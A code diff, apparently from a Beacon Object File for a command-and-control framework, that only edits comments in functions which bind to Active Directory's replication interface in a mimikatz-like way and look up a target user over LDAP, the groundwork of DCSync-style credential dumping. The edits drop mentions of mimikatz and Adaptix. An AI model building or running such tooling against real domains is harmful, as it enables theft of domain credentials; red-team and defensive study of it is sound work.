@@ -589,7 +589,7 @@ DRS_HANDLE BindToDRS(RPC_BINDING_HANDLE rpcBinding) {
     // Generate a random client DSA UUID
     RPCRT4$UuidCreate(&clientDsaUuid);
     
-    // Create DRS_EXTENSIONS_INT structure like mimikatz
+    // Create DRS_EXTENSIONS_INT structure
     extClient = (DRS_EXTENSIONS_INT*)MSVCRT$malloc(sizeof(DRS_EXTENSIONS_INT));
     if (!extClient) {
         return NULL;
@@ -601,7 +601,7 @@ DRS_HANDLE BindToDRS(RPC_BINDING_HANDLE rpcBinding) {
     extClient->Pid = 0;
     extClient->dwReplEpoch = 0;
     
-    // Call IDL_DRSBind - using the Microsoft RPC stub
+    // Call IDL_DRSBind using the Microsoft RPC stub
     result = IDL_DRSBind(
         rpcBinding,
         &clientDsaUuid,
@@ -874,7 +874,7 @@ void go(char *args, int alen) {
     datap parser;
     BeaconDataParse(&parser, args, alen);
     
-    // Parse arguments from Adaptix script
+    // Parse arguments
     char* target = BeaconDataExtract(&parser, NULL);        // Username or DN
     int isDN = BeaconDataInt(&parser);                      // 0 = username, 1 = DN
     char* ouPath = ValidateInput(BeaconDataExtract(&parser, NULL));
@@ -914,7 +914,7 @@ void go(char *args, int alen) {
         return;
     }
     
-    // Get DC context (defaultNamingContext + DC GUID) in optimized query
+    // Get DC context (defaultNamingContext + DC GUID)
     dcContext = GetDCContext(ld, dcHostname);
     if (!dcContext) {
         ERROR_PRINT( "[-] Failed to get DC context");
@@ -923,7 +923,7 @@ void go(char *args, int alen) {
         return;
     }
     
-    // Get all user info (DN, sAMAccountName, GUID) in a single LDAP query
+    // Get user info (DN, sAMAccountName, GUID)
     char* searchBase = (ouPath && MSVCRT$strlen(ouPath) > 0) ? ouPath : dcContext->defaultNamingContext;
     userInfo = GetUserInfo(ld, target, searchBase, isDN);
     
